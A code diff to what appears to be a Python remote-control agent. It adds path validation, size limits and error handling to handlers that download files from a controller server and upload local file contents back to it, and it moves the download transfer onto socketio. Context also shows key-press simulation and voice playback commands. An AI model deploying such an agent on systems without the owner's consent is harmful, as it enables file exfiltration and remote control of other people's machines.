@@ -3006,22 +3006,39 @@ def handle_file_upload(command_parts):
     """Handle file upload from controller."""
     try:
         if len(command_parts) < 3:
-            return "Invalid upload command format"
+            return "Invalid upload command format. Expected: upload-file:destination_path:base64_content"
         
         destination_path = command_parts[1]
         file_content_b64 = command_parts[2]
         
-        # Decode base64 content
-        file_content = base64.b64decode(file_content_b64)
+        # Security: Validate path to prevent directory traversal
+        destination_path = os.path.abspath(destination_path)
+        if not destination_path.startswith(os.getcwd()):
+            return "Error: Invalid destination path - security restriction"
+        
+        # Validate base64 content
+        try:
+            file_content = base64.b64decode(file_content_b64)
+        except Exception:
+            return "Error: Invalid base64 content"
         
         # Ensure directory exists
-        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        try:
+            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        except Exception as e:
+            return f"Error creating directory: {e}"
         
-        # Write file
-        with open(destination_path, 'wb') as f:
-            f.write(file_content)
-        
-        return f"File uploaded successfully to {destination_path}"
+        # Write file with proper error handling
+        try:
+            with open(destination_path, 'wb') as f:
+                f.write(file_content)
+            file_size = len(file_content)
+            return f"File uploaded successfully to {destination_path} ({file_size} bytes)"
+        except PermissionError:
+            return f"Error: Permission denied writing to {destination_path}"
+        except Exception as e:
+            return f"Error writing file: {e}"
+            
     except Exception as e:
         return f"File upload failed: {e}"
 
@@ -3029,23 +3046,50 @@ def handle_file_download(command_parts, agent_id):
     """Handle file download request from controller."""
     try:
         if len(command_parts) < 2:
-            return "Invalid download command format"
+            return "Invalid download command format. Expected: download-file:file_path"
         
         file_path = command_parts[1]
+        
+        # Security: Validate path to prevent directory traversal
+        file_path = os.path.abspath(file_path)
+        if not file_path.startswith(os.getcwd()):
+            return "Error: Invalid file path - security restriction"
         
         if not os.path.exists(file_path):
             return f"File not found: {file_path}"
         
+        # Check if it's a file (not directory)
+        if not os.path.isfile(file_path):
+            return f"Error: {file_path} is not a file"
+        
+        # Check file size to prevent memory issues
+        file_size = os.path.getsize(file_path)
+        if file_size > 100 * 1024 * 1024:  # 100MB limit
+            return f"Error: File too large ({file_size} bytes). Maximum size is 100MB"
+        
         # Read file and encode as base64
-        with open(file_path, 'rb') as f:
-            file_content = base64.b64encode(f.read()).decode('utf-8')
+        try:
+            with open(file_path, 'rb') as f:
+                file_content = base64.b64encode(f.read()).decode('utf-8')
+        except PermissionError:
+            return f"Error: Permission denied reading {file_path}"
+        except Exception as e:
+            return f"Error reading file: {e}"
         
-        # Send file to controller
-        filename = os.path.basename(file_path)
-        url = f"{SERVER_URL}/file_upload/{agent_id}"
-        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
-        
-        return f"File {file_path} sent to controller"
+        # Send file to controller via socketio instead of HTTP
+        try:
+            filename = os.path.basename(file_path)
+            sio.emit('file_download', {
+                'agent_id': agent_id,
+                'filename': filename,
+                'file_path': file_path,
+                'content': file_content,
+                'size': file_size
+            })
+            return f"File {filename} ({file_size} bytes) sent to controller"
+        except Exception as e:
+            return f"Error sending file to controller: {e}"
+            
     except Exception as e:
         return f"File download failed: {e}"
 
@@ -3238,10 +3282,14 @@ def main_loop(agent_id):
             if command in internal_commands:
                 internal_commands[command]()
             elif command.startswith("upload-file:"):
-                output = handle_file_upload(command.split(":", 2))
+                # Split by first two colons: upload-file:path:content
+                parts = command.split(":", 2)
+                output = handle_file_upload(parts)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("download-file:"):
-                output = handle_file_download(command.split(":", 1), agent_id)
+                # Split by first colon: download-file:path
+                parts = command.split(":", 1)
+                output = handle_file_download(parts, agent_id)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("play-voice:"):
                 output = handle_voice_playback(command.split(":", 1))
@@ -5766,6 +5814,25 @@ def on_key_press(data):
             })
     except Exception as e:
         print(f"Error simulating key press: {e}")
+
+@sio.on('file_upload')
+def on_file_upload(data):
+    """Handle file upload from controller via socketio."""
+    try:
+        destination_path = data.get('destination_path')
+        file_content_b64 = data.get('content')
+        
+        if not destination_path or not file_content_b64:
+            sio.emit('file_upload_result', {'success': False, 'error': 'Missing parameters'})
+            return
+        
+        # Use the existing handle_file_upload function
+        result = handle_file_upload(['upload-file', destination_path, file_content_b64])
+        success = 'successfully' in result.lower() and 'error' not in result.lower()
+        sio.emit('file_upload_result', {'success': success, 'result': result})
+        
+    except Exception as e:
+        sio.emit('file_upload_result', {'success': False, 'error': str(e)})
 
 def initialize_components():
     """Initialize high-performance components and input controllers."""
